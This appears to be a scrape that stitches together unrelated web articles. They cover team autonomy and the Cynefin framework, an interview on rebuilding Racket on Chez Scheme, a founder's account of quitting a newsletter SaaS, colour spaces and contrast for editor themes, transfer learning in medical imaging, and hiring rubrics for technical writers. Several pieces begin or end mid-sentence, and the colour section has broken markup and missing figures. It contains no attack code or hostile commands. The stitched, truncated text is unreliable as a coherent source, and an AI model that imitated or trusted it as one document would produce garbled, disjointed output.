<p>With this story, I hope that I sparked your imagination. The bottom line is that as a manager, in a sociotechnical system, we should create structures that help people and teams to achieve their autonomy and agency. There is a wide range of practices, rituals and tools that can help, and all of them are context-dependent. To make it tangible, let’s say that you are a company with 375 people, and you are an online photo printing solution. The solution is in the cloud, and you take care of producing and deliver the photos worldwide. You have a diverse landscape, with custom software and standard hardware (printers). We rely on partners for the logistics operations, and you have a distributed workforce across the globe, to be close to the customers. You can picture other details… As director of software, you are responsible for the custom software that your customers are delighted for.</p>

<p>You can think about different practices, rituals and tools to help autonomy and agency within the company. Let’ explore some very concreate scenarios, which I hope you can relate with.</p>

<h5 id="onboarding-of-new-colleagues">Onboarding of new colleagues</h5>
<p>A new software engineer is hired. She will join one of the teams, and as part of the onboarding process, she has the starter pack, where she can find the information about the contact person for different operations. Information such as pension and salary declarations are requested to the HR department, vacations are booked in the internal portal, or the software development process can be consulted in the wiki. There is also a public schedule of the different rituals of the teams, such as demos.</p>

<p>The starter pack allows her to have an idea about the owners of different information and processes, allowing her to be autonomous. How many times did we move between jobs and at the same move between time houses? The real state agencies require a lot of paperwork, and most of it is provided by our employer.</p>

<h5 id="communities-of-practice">Communities of practice</h5>
<p>The company is growing, and the software was a monolith, managed by two teams, is now a distributed set of services. The services are loosely coupled and operated by 15 teams. As the complexity of the system increases, the teams adopted principles of observability, and they nail logging and metrics. However, they want to invest in tracing, to increase their capabilities, and streamline the development and operations processes.</p>

<p>As such, a community of practice was created. People from different teams come together, and work on common problems, with the end in mind. It allows space to co-create, diverge and converge, experiment, until patterns and practices start to emerge, and are useful to the different teams. Other community practices can exist and be in different areas. This is not a “or” exercise, is more like a “and” one.</p>

<p>Communities of practice enable agency of teams, where they can continue to align with the organisation purpose, but devise their own way to execute their mission.</p>

<h5 id="a-new-service-is-added-to-the-landscape">A new service is added to the landscape</h5>
<p>The company is leveraging cloud services for the last 7 years, but recently they start to move their services from infrastructure-as-a-service to cloud-native, where applicable. It has an impact on the services and the way they are bootstrapped and wired. The platform team created a few templates with different goals: on one side how to migrate the services when the paradigm changes, and on the other side if you do a new service what are the barebones to bootstrap the basics (authentication, authorisation, monitoring, etc.)</p>

<p>Having these templates, a team reduce their lead time to create a new service. The templates and documentation allow them to understand how things are wired and how cloud-native can be leveraged. Once again, the teams can maintain their agency, reducing the burned over the platform team for the creation of new services. Also, there is a change for evolution, as teams can contribute to the templates, co-evolving them as new insights are generated.</p>

<h3 id="organisations-are-complex-sociotechnical-systems">Organisations are complex sociotechnical systems</h3>
<p>My goal with the examples is to provide some relatable scenarios, and I believe that stories are a great vehicle to convey a message. However, stories are context bounded, and the way that people or teams achieve something might not be feasible in a different context. Thus, my statement that ** organisations are complex sociotechnical systems**, and as a manager, we need to be aware of the complexity theory and how to navigate the inherent complexity.</p>

<p>I’m a student of complexity theory, and Cynefin, the work of <a href="https://twitter.com/snowded">Dave Snowden</a>. Cynefin framework is a sense-making framework, allowing us to make sense of the world. I will not go into the details of Cynefin, this is not the goal of the blog post, nor I’m a specialist. I’m just a student.</p>

<p>My point is that you can use Cynefin to make sense of the different needs of your organisation and help people to set-up the additional structures to create agency and autonomy. A great story that exemplifies it is “Cultivating Leadership with Cynefin: from tool to mindset” from Jennifer Garvey-Berger, Carolyn Coughlin, Keith Johnston and Jim Wicks, in the book <a href="https://www.cognitive-edge.com/cynefin-weaving-sense-making-into-the-fabric-of-our-world/">Cynefin, weaving sense-making unto the fabric of our world</a>. In this story, they show us how an organisation grow, and what were the structures that they added to allow the autonomy of the consultants, allowing their consultancy practice to evolve - a prime example of a Teal organisation.</p>

<p>Sometimes organisational structures to create autonomy and agency are not used on the spot. You need to nudge the system, observe and reflect. Sometimes the concept is new, and people and teams are getting used to it, trying to find the applicability. Other times, the structure is useless, and if that is the case just discard it. As I wrote in the beginning, our daughter got used to the learning tower, and across time increased her autonomy.</p>

<p>I hope this sparked some ideas with you. What are the organisational structures that allow autonomy and agency in your company?</p>

What makes it stand out in the LISP family?</strong></h2><p id="b428">Let’s distinguish “Racket the language” and “Racket the project”.</p><p id="f2e2">The Racket language is a general-purpose, Scheme-like language with an especially rich set of constructs for extending the language — even by Scheme standards. Racket includes support for writing quick-and-dirty macros, but it also supports nice macros with a good error checking that avoid surprising errors created in the expanded code. The close integration of macros and modules, an enforced phase separation between run-time and compile-time code, and the `#lang` mechanism for selecting the surface syntax all distinguish Racket from other Lisp variants.</p><p id="d48e">Even the main language Racket is written in a simpler language, and that is written in an even more simple language. This tower of languages makes development easier. You can look under the hood and see all the internal languages, or just ignore all of them and get a nice high level language.</p><p id="36f0">Less prominent, but also as important in practice for building language abstractions and composing them into large systems, are Racket’s run-time constructs: first-class control with continuation marks, custodians for simple and reliable task termination, reachability-based memory accounting, message-based parallelism via places, and Concurrent ML-style constructs for event-driven programs. Many of these constructs need support at lower levels of the runtime system, but then they can be used to build a wide variety of languages and libraries that mesh well.</p><p id="cb77">The Racket project synthesizes research, production, and education efforts toward the overall language-building goal. The idea of “A Programmable Programming Language” serves along those directions, from building student-friendly learning environments to domain-specific languages in application to pushing the frontiers of language design and implementation.</p><p id="a39d">The main page is <a href="https://racket-lang.org/" rel="noopener">https://racket-lang.org/</a></p><h2 id="47bc"><strong>What does it mean that you can write your own language?</strong></h2><p id="8534">For example, when you install Racket, it comes with 20 or 30 additional languages. (I’m not sure if someone has counted all of them.)</p><p id="adb8">There are a few “Student” languages that are designed for students. They are less powerful but have more compile time checks to detect common errors in beginners. And they have different levels so once you master one, you can use the next one that includes more features.</p><p id="e7f1">Another language is Typed Racket, that adds types to the Racket expressions, so it refuses to compile unless the types check. And it also uses the type information to optimize the code, so the compilation is slower, but the generated code can be faster.</p><p id="b5fa">There are languages that implement the version of Scheme in R5RS and R6RS and many of the SRFI. And you can install a package that adds the version in the R7RS-small.</p><p id="8dd3">And there are also more different languages with a very different syntax like a complete implementation of Algol 60.</p><p id="d422">All these languages share the same backend and you can call the libraries written in one language from any of the other languages that are included in the distribution, the additional languages you can download as packages, or the languages you create.</p><p id="7932"><strong>What’s the difference between Racket and Scheme?</strong></p><p id="f375">Racket started out as a Scheme implementation, and we would still call it “a Scheme.” Even though it does not fit a Scheme standard, it’s obviously derived from Scheme. There are many specific differences, such as the fact that `cons` always creates an immutable pair in Racket, but the main difference is philosophy: Scheme is meant to be a small language that gives you just enough to express lots of things. Racket is meant to be a big language, and while it gives you the same core pieces (and more) that can express lots of things, it also codifies the way many things are done to enable more cooperating libraries and languages.</p><h2 id="0256"><strong>What is Chez Scheme, how is it different from other Scheme implementations?</strong></h2><p id="1fb3">Chez Scheme is one of the oldest Scheme implementations, and its evolution informed many parts of the Scheme standard through R6RS. (Racket’s influence on the Scheme standard, in contrast, is limited to aspects of the R6RS library design.) Chez Scheme is a relatively small language, but like all instantiations of Scheme, the implementation provides a lot more than the standard specifies.</p><p id="3c1c">Chez Scheme’s biggest claim to fame is its performance. It has always been among the best-performing Scheme implementations. Its object-tagging and allocation regime, its hybrid stack–heap implementations of continuations, and its compiler structure all remain state-of-the-art, even in 2020.</p><p id="3095">For most of its existence, Chez Scheme was a proprietary, closed-source implementation, but it became open source in mid-2016. As it happens, we started considering a new Racket reimplementation around the start of 2017.</p><h2 id="54ea"><strong>Why did you choose Chez Scheme over other Schemes to rebuild Racket?</strong></h2><p id="db07">The biggest weakness of the Racket BC (“before Chez”) implementation are its back-end compiler structure, its inefficient internal calling conventions (over-adapted to C), and its poor implementation of first-class continuations. Those are exactly the strengths of Chez Scheme. Furthermore, Racket’s evaluation model was always closely aligned with Chez Scheme, such as the emphasis on interactive evaluation and compilation.</p><p id="d9a4">It was clear up front that Chez Scheme lacked significant features that Racket needs, such as support for continuation marks and reachability-based memory accounting. However, the high quality of the Chez Scheme design and implementation, in contrast to old Racket’s implementation, made adapting Chez Scheme more appealing than retrofitting Racket’s old implementation further.</p><h2 id="28e7"><strong>Why reimplement with Chez Scheme to reduce the C part instead of implementing the C stuff in Racket?</strong></h2><p id="2658">Mostly, we did reimplement the C stuff in Racket. The I/O subsystem, the concurrency subsystem (which includes the scheduler for “green” threads, Concurrent ML-style events, and custodians), and the regexp matcher were all rewritten in Racket. Those pieces followed the rewrite of the macro expander in Racket. Other things that needed to be moved out of C, such as the compiler and the extensive support for numbers that Racket inherited from Scheme, were already written in Scheme in Chez Scheme’s implementation.</p><p id="b995">A big part of the process was to understand what to implement in Racket, what in Chez Scheme, and what new layers to introduce in translation. This work and reorganization benefits other Racket implementation efforts, such as Pycket and RacketScript.</p><h2 id="de40"><strong>Besides improving maintainability, what are the advantages of building Racket with CS over C?</strong></h2><p id="4952">With the exception of the garbage collector and similar low-level parts of the runtime system, much of Racket’s implementation benefits from higher-level abstractions. Writing a macro expander in C was a particularly poor choice, since higher-level abstractions obviously make tree manipulations easier, but the same reasons apply for the I/O layer or numeric primitives. Even the garbage collector in [the Racket variant of] Chez Scheme is now half implemented by a specification and compiler that are written in Scheme.</p><p id="60db">The other big advantage is that the Racket community has a lot of Racket programmers, not C programmers. It’s easier to convince a fan of Racket to look at some code in Racket or Chez Scheme and try to find some bug or a new feature to contribute. The people that like to read and write code in C are probably making contributions to a C compiler.</p><h2 id="e706"><strong>What were the most challenging parts to implement?</strong></h2><p id="971c">The most challenging part is not really one part, but the overall scale. Racket is a big language, and it all has to work the same in the new implementation. That means not just getting the right result and/or a specific kind of error message, but getting results with the same or better performance characteristics. For example, if a macro generates a giant expansion that nevertheless compiles in reasonable time in Racket BC, then it needs to compile in reasonable time in Racket CS.</p><p id="c985">When it comes to specific pieces that we had to implement, perhaps the most challenging were adding type reconstruction to the compiler, adding support for continuation marks, allowing record values to act as procedures, reimplementing Racket’s I/O, and upgrading Chez Scheme’s …</p></div></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I made a big mistake.</p><p>It was at the end of December of 2019, and I started working right away on my idea. A platform to send newsletters.</p><p>I spent six months working on it. Every day. From Monday to Sunday, until I had an MVP. I was very proud of what I created, and I wanted to share it with the world.</p><p>The results: Zero clients.</p><p>I was expecting people to try it, at least out of curiosity or to think about using it. But no one did.</p><p>Is the project a failure because I have zero clients?</p><p>1 - The site only had around 4K visits so far. That's not enough.<br>2 - From those people, 99% were visits from places like Indie Hackers, Product Hunt, BetaList, etc. Are they my clients? Maybe not.</p><p>I have two big reasons to consider this a failure.</p><h3><strong>1 - I still need to put in twelve more months of work</strong>.</h3><p>To add paid newsletters, static pages, a better writing editor, a blogging experience, custom domains…. If I want to create those, I need to spend at least another 12 months. Probably more.</p><p>And for what? Adding more features is not going to help with finding clients because they won't see them.</p><h3><strong>2 - I need to find clients</strong>.</h3><p>I am sure that you can make a lot of money from a service like this. </p><p>The problem is, if I code, I can't do sales or marketing. It seems to me that there are at least 3 full-time jobs to do simultaneously, and that's too big for me.</p><p>I was naive when I started.</p><h2><strong>What was my big mistake?</strong></h2><p>I wanted to create a Micro-Saas. I wasn't looking to be a big company. I thought to have 500-1000 clients and make 10/20K per month.</p><p>I wanted to create a family business. Pay salaries for a couple of people and flying low. I wasn't looking for attention. I didn't want to be the greatest entrepreneur.</p><p>My big mistake was to think that creating a SaaS was easy. At least easier. I was expecting to have 50/100 clients in the first couple of months. I thought: "Internet is big, they will come."</p><p>And there is some truth to that, but I learned after that you need to find them. Or spend money on ads. Or both.</p><p>And I don't know how to do it, and I don't have a budget for that or the experience.</p><h3><strong>What do I mean by "I quit"?</strong></h3><p>I quit big projects that keep me attached to my desk for years and infinity hours. Projects that you can never say: done. A SaaS is never done.</p><p>Last week I created and launched&nbsp;<a href="http://slideslist.com/">slideslist.com</a>. It took me a week to create it. It had some visits and no sales, but it doesn't matter. No risks were taken and minimal effort.</p><h3>How to know if you should start a project?</h3><p>If you are starting today, you should start small. It would be best if you learn first. Start by creating a SaaS is too big and risky in time, money, and effort or even Micro-SaaS. The "micro" doesn't reflect the effort you need to put in anyway.</p><p>Create something small in less than a month and try to sell it. You will see how hard it is and how many people tell you: "nice! I will take a look later" And they will never do. So then you learn, and you keep trying small things until you have enough experience.</p><p>Even enough experience to realize that creating a SaaS is not for you. Like I learned.</p><h2><strong>Do You Need to Create a SaaS?</strong></h2><p>I’d say probably not, but I am still figuring this out.</p><p>I started this to be free. And being free involves, of course, having more money. But I don't want to buy a fancy car or a big house. You can make a lot of money from a SaaS, but there are also other ways to make money online. </p><p>The problem with the SaaS I was creating is that I was giving away my freedom by doing things that I wasn't enjoying. But I didn't want to spend every single hour of the day adding more features and at the same time trying to find clients.</p><p>If that's what you want, that's fantastic, go ahead and start a SaaS. But that's not what I wanted.</p><p>I romanticized the idea of travel and writing. And that's what I want. I wanted to make money to write, to share lessons on the things that I think are valuable for people to have a better and more balanced life.</p><p><strong>Know yourself.</strong></p><p>If I wanted to write, why was I spending my time creating a SaaS?</p><p><strong>Now I am writing, and let’s see from here.</strong></p><p>Thanks to this&nbsp;<a href="https://www.indiehackers.com/post/after-losing-38676-as-an-indie-hacker-i-cant-do-it-anymore-i-quit-8673223598">article</a>&nbsp;I published telling my story I learned that I might not have to create a SaaS to start living the life I want.</p><p>People paid me for it, and I made a good amount of money. It paid my rent for the month, and that blew my mind.</p><p>So I decided to start a newsletter and a blog and start writing about the things I enjoy. Who knows if in the future I will go back again trying to create a big project, but for now, I’m going to try something small that is also fun to do for me. </p><p>👉&nbsp;If you liked this article, share it with your friends!

<p>
In July 2020 I went on a color-scheme vision quest. This led to some research on various <a href="https://en.wikipedia.org/wiki/Color_space">color spaces</a> and their utility, some investigation into the <a href="http://chriskempson.com/projects/base16/#styling-guidelines">styling guidelines</a> outlined by the base16 project, and the <a href="https://github.com/emacs-mirror/emacs/blob/master/lisp/color.el">color utilities</a> that ship within the GNU Emacs text editor. This article will be a whirlwind tour of things you can do to individual colors, and at the end how I put these blocks together.
</p>

<div id="outline-container-orgbe4e3e9">
<h2 id="h-3fe0b0c6-76a6-4e9e-a061-66bd3ba54620"><span>1</span> <a href="#h-3fe0b0c6-76a6-4e9e-a061-66bd3ba54620">Motivation</a></h2>
<div id="text-h-3fe0b0c6-76a6-4e9e-a061-66bd3ba54620">
<p>
I've been a part of several Linux desktop customization communities since circa 2013. One big aspect of that is the colors used across various contexts – for me, it follows that part of the game is trying to make a cohesive system of colors that relate to each other in an understandable (and thus tweakable) way – know what I can do to individual colors when making a "color framework" helps immensely.
</p>

<p>
I'm colorblind. This means I might be really picky about some colors. For example, I don't like the color red used for emphasis in text – thin red lines look the same as thin black lines to me (and so, red text doesn't typically &gt;POP&lt; for me, unless it's bold or has some other emphasis included).
</p>

<p>
Bootstrapping builders exist for base16! If I can bootstrap on top of their system I get a lot of free coverage within the software ecosystem.
</p>

<p>
Plus, I just find this sort of thing really fun. Visual feedback is pleasing. Finding the right colors makes my lizard brain return to monke.

<p>
This will be the focal point of inconsistency. The level of brightness, quality of screen, and ambient lighting level are all things that affect the value of the screen's <a href="https://en.wikipedia.org/wiki/White_point">white point</a>, which is what everything else is relative too. Luckily you can (attempt to) account for this as well.

<p>
Color spaces are ways of defining colors in different sets of properties. They are the main tool you will have for reasoning about tweaking <i>individual</i> colors. You can then mess with these and convert them back into a format you can render (typically RGB) within a <a href="https://en.wikipedia.org/wiki/Gamut">color gamut</a> (a range of supported colors). Here I will be pretty high level, focusing on some visuals for what sorts of things these properties look like. When I define the valid values for ranges, I will be using the scale I've implemented in my <a href="#h-cb3c6479-7d62-4028-8942-2b033bb1247a">helpers</a>.
</p>

The one you know and love:  [R]ed, [G]reen, [B]lue. Your knobs are amounts of each. As you turn everything up, you approach <code>#ffffff</code> (and down, -&gt; <code>#000000</code>). This isn't particularly flexible in "ways you can think about colors".
</p>

<p>
Here is a gradient from <code>#cc3333</code> to <code>#33cc33</code> to <code>#3333cc</code>:
</p>

 


<p>
To show the lighting effect, let's repeat the above gradient, but instead of using <code>33</code> for filler, we'll use <code>99</code> – that's triple(!) the secondary color amounts:

Saturation in HSL is a controlled version of chromacity ("distance from gray"). See the wiki section for more details.
</p>

</p>

<p>
Hue has several defined points (at rotating 60° angles), I like to think of it like a color compass:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 60°</p>
<p>green, 120°</p>
<p>cyan, 180°</p>
<p>blue, 240°</p>
<p>magenta, 300°</p>
 </div> 


<p> HSL: Hue rotation 0-360 (step 60°), saturation 50%, lightness 50% </p> 


<p>
Let's see the effect saturation has:
</p>

 


<p> HSL: saturation scale 0-100% (step 10%), lightness 50%, hue 240° (blue) </p> 


<p>
And lightness:
</p>

 


<p> HSL: lightness scale 0-100% (step 10%), saturation 50%, hue 240° (blue) </p> 

</div>
</div>

<div id="outline-container-org758eb61">
<h3 id="h-c147b84d-d95b-4d2d-8426-2f96529a8428"><span>3.3</span> <a href="#h-c147b84d-d95b-4d2d-8426-2f96529a8428">HSLuv</a></h3>
<div id="text-h-c147b84d-d95b-4d2d-8426-2f96529a8428">
<p>
<a href="https://www.hsluv.org/comparison/">hsluv</a> is an altered version of HSL that tries to be perceptually uniform with regards to lightness. HSL lightness by comparison is hard to make contrast comparisons in.
</p>

<p>
What does that mean for us? Well, let's take our above examples and recreate them in the HSLuv space:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 60°</p>
<p>green, 120°</p>
<p>cyan, 180°</p>
<p>blue, 240°</p>
<p>magenta, 300°</p>
 </div> 


<p> HSLuv: Hue rotation 0-360 (step 60°), saturation 50%, lightness 50% </p> 


<p>
Saturation:
</p>

 


<p> HSLuv: saturation scale 0-100% (step 10%), lightness 50%, hue 240° (blue) </p> 


<p>
Lightness:
</p>

 


<p> HSLuv: lightness scale 0-100% (step 10%), saturation 50%, hue 240° (blue) </p> 


<p>
These scales definitely look more consistent when reasoning about lightness values. HSL's hue feels all over the place by comparison – though at the same time that might be a more natural color mixing feel.
</p>

<p>
The white point is a defined <a href="https://en.wikipedia.org/wiki/Standard_illuminant">standard illuminate</a>  not intrinsic to the value of a color. It is an additional piece of information you provide to functions when converting into and out of the CIELAB colorspace.
</p>

<p>
The standard white point is defined as <code>d65</code> – in this section, every conversion will be made with <code>d65</code>. Here is a table of commonly used white points and their meaning (for values, see the bottom of the wikipedia link).

The knobs A and B allow you to play with the 4 primary colors of the LAB space. If you take a look at the values, you might notice that the more negative we go, we get "cooler" colors, while on the positive end, we get "warmer" colors.
</p>

<p>
Let's look at some LAB colors. The labels below will have the values of  <code>(L A B)</code> – Remember, A is green to red, B is blue to yellow (each with a value -100 to 100)

LCH is a "cylindrical" version of cieLAB. What that means for us is that Hue is different. Instead of 6 defined islands to sail to with our color compass, there are 4:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 90°</p>
<p>green, 180°</p>
<p>blue, 270°</p>

<p> LCH: Hue rotation 0-360 (step 90°), saturation 50%, luminance 50% </p> 


<p>
LCH lightness:
</p>
 


<p> LCH: lightness scale 0-100% (step 10%), chromacity 50%, hue 270° (blue) </p> 


<p>
Chromacity, "distance from gray" - very similar to Saturation (which I've seen cited as simply misnamed chromacity):
</p>

 


<p> LCH: chromacity scale 0-100% (step 10%), luminance 70%, hue 270° (blue) </p> 


<p>
Let's compare some spaces. We'll take some the RGB gradient from above, normalize the lightness in HSLuv and then maximize l[C]h, H[S]L, and H[S]Luv:
</p>

 


<p> original </p> 


 


<p> squash lightness to 50 in HSLuv </p> 


 
  
  


<p> 3 branches off of the above: LCH maximize C, HSL maximize S, HSLuv maximize S </p>

For text, the Web Content Assembly Guidelines (WCAG) recommend at least a 4.5:1 contrast ratio: <a href="https://www.w3.org/TR/WCAG/#contrast-minimum">link</a>. Let's take a look at some different text contrasts! I will steal the backgrounds used here from the base-16 grayscale sets: <code>#f7f7f7</code> and <code>#101010</code>. For reference, the contrast ratio between <code>#000000</code> and <code>#ffffff</code> is 21.0

Color distance is a measure of how far apart colors are by properties in spaces. For example, let's take the 'magenta' color from above, and increase it's brightness and hue until we're some minimal distance away. We'll aim for 33(out of 100) measured in the CIELAB space:

<p>
Color distance is useful because it lets us measure a kind of similarity between colors. You can use this to control where you stop transformations (color space property tweaks).

<p>Novel deep learning models in medical imaging appear one after another. The thing that  these models still significantly lack is the ability to generalize to unseen clinical data. Unseen data refer to real-life conditions that are typically different from the ones encountered during training. So when we want to apply a model in clinical practice, we are likely to fail. Furthermore, the provided training data is often limited. This constricts the expressive capability of deep models, as their performance is bounded by the number of data. And the only solution is to find more data. Since it is not always possible to find the exact supervised data you want, you may consider transfer learning as a choice.</p>

</blockquote>

<p>In natural images, we always use the available pretrained models. We may use them for image classification, object detection, or segmentation. And surprisingly it always works quite well. This mainly happens because RGB images follow a distribution. The shift between different RGB datasets is not significantly large. Admittedly, medical images are by far different. <strong>Each medical device produces images based on different physics principles. Subsequently, the distribution of the different modalities is quite dissimilar</strong>. The reason we care about it?</p>

<p>Transfer learning of course! If you want to learn the particularities of transfer learning in medical imaging, you are in the right place.</p>

<h2 id="what-is-transfer-learning">What is Transfer Learning?</h2>

<p>Let’s say that we intend to train a model for some task X (domain A). Thus, we assume that we have acquired annotated data from domain A. A task is our objective, image classification, and the domain is where our data is coming from. In medical imaging, think of it as different <a href="https://theaisummer.com/medical-image-coordinates/" target="_blank">modalities</a>. When we directly train a model on domain A for task X, we expect it to perform well on unseen data from domain A. What happens if we want to train a model to perform a new task Y?</p>

<blockquote>
  <p>In transfer learning, we try to store this knowledge gained in solving a task from the source domain A and apply it to another domain B.</p>
</blockquote>

<p>The source and target task may or may not be the same. In general, we denote the target task as Y. We store the information in the weights of the model. Instead of random weights, we initialize with the learned weights from task A. If the new task Y is different from the trained task X then the last layer (or even larger parts of the networks) is discarded.</p>

<p><img src="https://theaisummer.com/assets/img/posts/medical-imaging-transfer-learning/transfer-learning-diagram.png" alt="transfer-learning-diagram">
<em>An overview of transfer learning. Image by Author</em></p>

<p>For example, for image classification we discard the last hidden layers. In encoder-decoder architectures we often pretrain the encoder in a downstream task. But how different can a domain be in medical imaging? What kind of tasks are suited for pretraining? What parts of the model should be kept for fine tuning?</p>

<p>We will try to tackle these questions in medical imaging.</p>

<h2 id="transfer-learning-from-imagenet-for-2d-medical-image-classification-ct-and-retina-images">Transfer learning from ImageNet for 2D medical image classification (CT and Retina images)</h2>

<p>Obviously, there are significantly more datasets of natural images. The most common one for transfer learning is ImageNet, with more than 1 million images. Therefore, an open question arises: How much ImageNet feature reuse is helpful for medical images?</p>

<p>Let’s introduce some context. ImageNet has 1000 classes. That’s why pretrained models have a lot of parameters in the last layers on this dataset. On the other hand, medical image datasets have a small set of classes, frequently less than 20. So, the design is suboptimal and probably these models are overparametrized for the medical imaging datasets.</p>

<p>In the case of the work that we‘ll describe we have chest CT slices of 224x224 (resized) that are used to diagnose 5 different thoracic pathologies: atelectasis, cardiomegaly, consolidation, edema, and pleural effusion. The RETINA <a href="https://github.com/yiweichen04/retina_dataset" rel="noopener" target="_blank">dataset</a> consists of retinal fundus photographs, which are images of the back of the eye.</p>

<p><img src="https://theaisummer.com/assets/img/posts/medical-imaging-transfer-learning/fundus-photograph.png" alt="fundus-photograph">
<em>A normal fundus photograph of the right eye. Taken from <a href="https://en.wikipedia.org/wiki/Fundus_photography" rel="noopener" target="_blank">Wikipedia</a></em></p>

<p>Such images are too large (i.e. 3 x 587 × 587) for a deep neural network.</p>

<p>It is obvious that this 3-channel image is not even close to an RGB image. To understand the impact of transfer learning, Raghu et al [1] introduced some remarkable guidelines in their work: “Transfusion: Understanding Transfer Learning for Medical Imaging”.</p>

<p>In general, one of the main findings of [1] is that transfer learning <strong>primarily helps the larger models</strong>, compared to smaller ones. Intuitively, it makes sense! Smaller models do not exhibit such performance gains. Moreover, for large models, such as ResNet and InceptionNet, pretrained weights learn different representations than training from random initialization. Apart from that, large models change less during fine-tuning, especially in the lowest layers.</p>

<p>To address these issues, the Raghu et al [1] proposed two solutions:</p>

<p>1) <strong>Transfer the scale (range) of the weights instead of the weights themselves</strong>. This offers feature-independent benefits that facilitate convergence. In particular, they initialized the weights from a normal distribution \(N(\mu; \sigma)\). The mean and the variance of the weight matrix is calculated from the pretrained weights. This calculation was performed for each layer separately. As a result, the new initialization scheme inherits the scaling of the pretrained weights but forgets the representations. The following plots illustrate the pre-described method (Mean Var) and it’s speedup in convergence.</p>

<p><img src="https://theaisummer.com/assets/img/posts/medical-imaging-transfer-learning/accuracy-2d-medical-image-pretraining.png" alt="accuracy-2d-medical-image-pretraining">
<em>The effect of ImageNet pretraining. Image by [1] <a href="https://arxiv.org/abs/1902.07208" rel="noopener" target="_blank">Source</a></em></p>

<p>2) <strong>Use the pretrained weights only from the lowest two layers</strong>. The rest of the network is randomly initialized and fine-tuned for the medical imaging task. This hybrid method has the biggest impact on convergence. To summarize, most of the most meaningful feature representations are learned in the lowest two layers.</p>

<p>Finally, keep in mind that so far we refer to 2D medical imaging tasks. What about 3D medical imaging datasets?</p>

<h2 id="transfer-learning-for-3d-mri-brain-tumor-segmentation">Transfer Learning for 3D MRI Brain Tumor Segmentation</h2>

<p>Wacker et al. [4] attempt to use ImageNet weight with an architecture that combines ResNet (ResNet 34) with a decoder. In this way, they simply treat three MRI modalities as RGB input channels of the</p>

<p>pretrained encoder architecture. The pretrained convolutional layers of ResNet used in the downsampling path of the encoder, forming a <a href="https://theaisummer.com/skip-connections/" target="_blank">U-shaped</a> architecture for <a href="https://theaisummer.com/medical-image-deep-learning/" target="_blank">MRI segmentation</a>.</p>

<p>To process 3D volumes, they extend the 3x3 convolutions inside ResNet34 with 1x3x3 convolutions. Thereby, the number of parameters is kept intact, while pretrained 2D weights are loaded. Simply, the ResNet encoder simply processes the volumetric data slice-wise. They used the <a href="https://www.med.upenn.edu/sbia/brats2018/data.html" rel="noopener" target="_blank">Brats dataset</a> where you try to segment the different types of tumors. The different tumor classes are illustrated in the Figure below.</p>

<p><img src="https://theaisummer.com/assets/img/posts/medical-imaging-transfer-learning/per-class-score-tumor-segmentation.png" alt="per-class-score-tumor-segmentation">
<em>Image by Wacker et al. [4]. <a href="https://arxiv.org/pdf/1912.12452.pdf" rel="noopener" target="_blank">Source</a></em></p>

<p>The results of the pretraining were rather marginal. Moreover, this setup can only be applied when you deal with exactly three modalities. However, this is not always the case.</p>

<h2 id="transfer-learning-for-3d-lung-segmentation-and-pulmonary-nodule-classification">Transfer Learning for 3D lung segmentation and pulmonary nodule classification</h2>

<p>In general, 10%-20% of patients with lung cancer are diagnosed via a pulmonary nodule detection. According to Wikipedia [<a href="https://en.wikipedia.org/wiki/Lung_nodule" rel="noopener" target="_blank">6</a>]: “A <strong>lung nodule</strong> or <strong>pulmonary nodule</strong> is a relatively small focal density in the lung. It is a mass in the lung smaller than 3 centimeters in diameter. The nodule most commonly represents a benign tumor, but in around 20% of cases, it represents malignant cancer.”</p>

<p><img src="https://theaisummer.com/assets/img/posts/medical-imaging-transfer-learning/pulmonary-nodule.png" alt="pulmonary-nodule">
<em>Pulmonary nodule detection. The image is taken from <a href="med3d:%20Transfer%20Learning%20for%203D%20Medical%20Image%20Analysis">Wikipedia</a>.</em></p>

<p>Let’s go back to our favorite topic. So, if transferring weights from ImageNet is not that effective why don’t we try to add up all the medical data that we can find? Simple, but effective! Chen et al. collected a series of public CT and MRI datasets. Most of the data can be found on <a href="http://medicaldecathlon.com/index.html" rel="noopener" target="_blank">Medical Image Decathlon</a>. Nonetheless, the data come from different domains, modalities, target organs, pathologies. They use a family of 3D-ResNet models in the encoder part. The decoder consists of transpose convolutions to upsample the feature in the dimension of the segmentation map. To deal with multiple datasets, different decoders were used. The different decoders for each task are commonly referred to as “heads” in the literature. The depicted architecture is called Med3D. Below you can inspect how they transfer the weights for image classification.</p>

<p><img src="https://theaisummer.com/assets/img/posts/medical-imaging-transfer-learning/med-3d-architecture.png" alt="med-3d-architecture">
<em>An overview of the Med3D architecture [2]</em></p>

<p>To deal with multi-modal datasets they used only one modality. They compared the pretraining on medical imaging with Train From Scratch (<strong>TFS</strong>) as well as from the weights of the <a href="https://deepmind.com/research/open-source/kinetics" rel="noopener" target="_blank">Kinetics</a>, which is an action recognition video dataset. I have to say here, that I am surprised that such a dataset worked better than TFS! The results are much more promising, compared to what we saw before.</p>

<p>This table exposes the need for large-scale medical imaging datasets. ResNet’s show a huge gain both in segmentation (left column) as well as in classification (right column). Notice that lung segmentation exhibits a bigger gain due to the task relevance. In both cases, only the encoder was pretrained.</p>

      <p>Hiring is always hard, but the more specialized your hire, the harder it will be. If you’re managing a technical blog and you want to <a href="https://draft.dev/learn/posts/finding-motivating-writers">stop writing everything yourself</a>, you’ll need to recruit and hire technical writers to help you out.</p>

<p>While traditionally used in education, rubrics are a fantastic tool for hiring, and I’ve used them for years both as <a href="https://www.karllhughes.com/posts/developing-talent">an engineering manager</a> and content manager at Draft. Whether you are bringing on a part-time freelancer or a full-time hire, having a good rubric will help you <a href="https://www.managementcenter.org/article/mitigate-bias-in-hiring-with-a-simple-rubric/">objectively evaluate candidates</a> and keep you focused on the criteria that matter for your job.</p>

</p>

<h2 id="what-is-a-hiring-rubric">What is a Hiring Rubric?</h2>
<p>A hiring rubric is a document that defines the criteria you use to decide whether a candidate is a good fit for your role or not. It typically includes several attributes upon which you will evaluate candidates and a few levels within each attribute that measure their skill.</p>

<p><img src="https://i.imgur.com/PaRd7YK.png" alt="A template for a rubric with three attributes and four levels"></p>

<p>To effectively use a rubric, you need to apply it consistently using measurable and observable behaviors. This means that a good rubric eliminates hiring by “gut feel” and forces you to stay focused on the characteristics that candidates display throughout the hiring process.</p>


      


      
<h2 id="the-draftdev-rubric-for-hiring-technical-writers">The Draft.dev Rubric for Hiring Technical Writers</h2>
